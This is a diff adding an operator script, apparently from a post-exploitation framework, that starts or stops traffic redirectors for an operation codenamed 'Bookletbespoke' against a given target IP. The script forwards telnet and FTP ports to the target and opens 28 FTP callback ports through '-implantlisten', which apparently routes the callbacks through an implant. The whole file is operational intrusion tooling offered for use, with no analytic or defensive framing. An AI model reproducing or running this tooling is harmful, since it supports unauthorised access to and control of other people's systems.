@@ -1,0 +1,93 @@
+#--------------------------------------------------------
+#  Start State:	Assumes nothing
+#  End State:	The redirectors necessary for a Bookletbespoke
+#		operation are started.
+#
+# Arguments:
+#    $argv[1] = The target IP address
+#    $argv[2] = The Bookletbespoke FTP callback port to start on
+#
+# Modifications:
+#  10/21/03	Created.
+#--------------------------------------------------------
+
+string $targetIP="";
+int $startingPort=55555;
+int $numPorts=28;
+string $startOrStop="START";
+
+if (($argc < 3) || ($argv[1] == "?")) {
+    echo "Usage: $argv[0] <targetIP> <FTP callbackPort> [<START|STOP>]";
+	echo "  default is START";
+    return false;
+} else {
+	$targetIP=$argv[1];
+	$startingPort=<int>$argv[2];
+	if ($argc >= 4) {
+		$startOrStop=$argv[3];
+	}
+}
+int $targetPort=$startingPort;
+
+
+echo "Bookletbespoke redirectors:";
+echo "         Target IP : $targetIP";
+int $counter=1;
+while ($counter <= $numPorts) {
+	echo "FTP Callback Port $counter: $targetPort";
+	$targetPort++;
+	$targetPort++;
+	$counter++;
+}
+ifnot (prompt "Do you want to continue?") {
+    echo "Aborting script...";
+    return false;
+}
+
+bool $success=true;
+
+string $command;
+
+if ($startOrStop=="START") {
+	$command="background redirect -tcp -lplisten 23 -target $targetIP 23";
+} else {
+	$command="stop redirect -contains \"tcp -lplisten 23 -target $targetIP 23\"";
+}
+ifnot (`$command`) {
+	$success=false;
+	echo "Could not set up redirector!";
+	pause;
+}
+
+if ($startOrStop=="START") {
+	$command="background redirect -tcp -lplisten 21 -target $targetIP 21";
+} else {
+	$command="stop redirect -contains \"tcp -lplisten 21 -target $targetIP 21\"";
+}
+ifnot (`$command`) {
+	$success=false;
+	echo "Could not set up redirector!";
+	pause;
+}
+	
+#`background redirect -tcp -lplisten 22 -target $targetIP 22`;
+
+$counter=1;
+$targetPort=$startingPort;
+while ($counter <= $numPorts) {
+	if ($startOrStop=="START") {
+		$command="background redirect -tcp -implantlisten $targetPort -target 127.0.0.1 $targetPort";
+	} else {
+		$command="stop redirect -contains \"tcp -implantlisten $targetPort -target 127.0.0.1 $targetPort\"";
+	}	
+	ifnot (`$command`) {
+		$success=false;
+		echo "Could not set up redirector!";
+		pause;
+	}
+	$targetPort++;
+	$targetPort++;
+	$counter++;
+}
+
+return $success;
